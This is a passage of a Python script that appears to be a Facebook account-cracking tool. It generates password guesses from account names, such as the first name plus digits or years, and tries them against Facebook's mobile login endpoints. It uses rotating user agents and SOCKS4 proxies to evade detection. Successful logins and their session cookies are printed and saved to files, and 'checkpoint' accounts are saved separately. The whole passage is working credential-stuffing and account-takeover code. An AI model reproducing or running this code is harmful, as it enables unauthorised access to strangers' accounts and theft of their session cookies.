					pwv.append(frs+'4321')
					pwv.append(frs+'00') 
					pwv.append(frs+'01') 
					pwv.append(frs+'02') 
					pwv.append(frs+'03') 
					pwv.append(frs+'04') 
					pwv.append(frs+'05') 
					pwv.append(frs+'06') 
					pwv.append(frs+'07') 
					pwv.append(frs+'08') 
					pwv.append(frs+'09') 
					pwv.append(frs+'10') 
					pwv.append(frs+'11') 
					pwv.append(frs+'12')
					pwv.append('shanto1122')
					pwv.append('bahauddin')
					pwv.append(nmf+'1122')
					pwv.append(nmf+'@@@')
					pwv.append(nmf+'@')
					pwv.append(nmf+'@@')
					pwv.append(nmf+'@123@')
					pwv.append(nmf+'@1122@')
					pwv.append(nmf+'@1234@')
					pwv.append(nmf+'@#@#@#')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'2023')
					pwv.append(nmf+'2023')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print('|')
	cetak(nel('\t[cyan][green] CRACK DONE [cyan] [white] '))
	print(f'[{b}.{x}]{hh} OK : {hh}%s '%(ok))
	print(f'{x}[{b}.{x}]{kk} CP : {kk}%s{x} '%(cp))
	print('|')
	print('>Choose( Y/t ) ? ')
	woi = input('>Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>{k} Good Bye {x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	#sys.stdout.write(f'\r \33[1;94m[BLACK\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(ok))),
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \33[1;95m[BLACK]  {h}[{kk}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#os.system("play-audio m.mp3 ")
				print(f'\r \x1b[1;93m CHECKPOINT-[🥶] {idf} | {pw}{N}')     
				open('BLACK_CP.txt' , 'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#os.system("play-audio bd.mp3 ")
				print(f'\r{H}\nSUCCESSFUL [💚] {idf} | {pw}\n[🌸]COOKIES ➢ \x1b[1;97m{kuki}')
				cek_apk(session,coki)
				open('BLACK_OK.txt' , 'a').write(idf+'|'+pw+'|'+ua+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	Fire_Main()
